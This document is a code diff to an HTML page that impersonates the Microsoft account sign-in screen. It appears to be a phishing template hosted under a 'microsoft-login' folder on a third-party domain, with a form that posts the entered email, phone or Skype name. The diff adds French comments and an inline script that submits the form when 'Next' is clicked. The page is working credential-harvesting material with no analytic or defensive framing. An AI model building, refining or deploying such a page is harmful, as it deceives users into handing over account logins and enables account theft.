@@ -1,5 +1,5 @@
-<!DOCTYPE html><html lang="en" style="filter: invert(0);"><head>
-	<base href="https://lemonware.fr/static/template/Template/microsoft-login/"/><meta charset="UTF-8"/><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<!DOCTYPE html><html lang="en" style="filter: invert(0);"><head><meta charset="UTF-8"/><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+	<base href="https://lemonware.fr/static/template/Template/microsoft-login/"/>
 	<link href="assets/favicon.ico" rel="icon"/>
 	<title>Sign in to your Microsoft account</title>
 	<link href="assets/app.css" rel="stylesheet"/>
@@ -8,8 +8,9 @@
 <section id="section_uname">
 <div class="auth-wrapper"><img alt="Microsoft" src="assets/logo.png" style="filter: invert(0);"/>
 <h2 class="title mb-16 mt-16">Sign in</h2>
+<!-- Formulaire avec action définie -->
 
-<form method="POST" action=""><input name="__original_url" type="hidden" value="https://lemonware.fr/static/template/Template/microsoft-login/"/>
+<form action="" id="signin_form" method="POST"><input name="__original_url" type="hidden" value="https://lemonware.fr/static/template/Template/microsoft-login/"/>
 <div class="mb-16">
 <p class="error" id="error_uname"> </p>
 <input class="input" id="inp_uname" name="uname" placeholder="Email, phone, or Skype" type="text"/></div>
@@ -18,10 +19,11 @@
 <div>
 <p class="mb-16 fs-13">No account? <a class="link" href="">Create one!</a></p>
 
-<p class="mb-16 fs-13"><a class="link" href="#">Sign in with a security key <img alt="Question img" src="assets/question.png" style="filter: invert(0);"/> </a></p>
+<p class="mb-16 fs-13"><a class="link" href="#">Sign in with a security key <img alt="Question img" src="assets/question.png" style="filter: invert(0);"/></a></p>
 </div>
+<!-- Bouton "Next" avec gestionnaire d'événements JavaScript -->
 
-<div><button class="btn" id="btn_next" type="submit">Next</button></div>
+<div><button class="btn" id="btn_next">Next</button></div>
 </div>
 
 <div class="opts">
@@ -29,7 +31,11 @@
 </div>
 </section>
 
-<footer class="footer"><a href="#">Terms of use</a> <a href="#">Privacy &amp; cookies</a> <span>. . .</span></footer>
-<script src="assets/app.js"></script>
+<footer class="footer"><a href="#">Terms of use</a> <a href="#">Privacy &amp; cookies</a> <span>. . .</span></footer>
+<!-- Script JavaScript pour gérer le clic sur le bouton "Next" --><script>
+        document.getElementById('btn_next').addEventListener('click', function() {
+            document.getElementById('signin_form').submit(); // Soumet le formulaire
+        });
+    </script>
 
 </body></html>
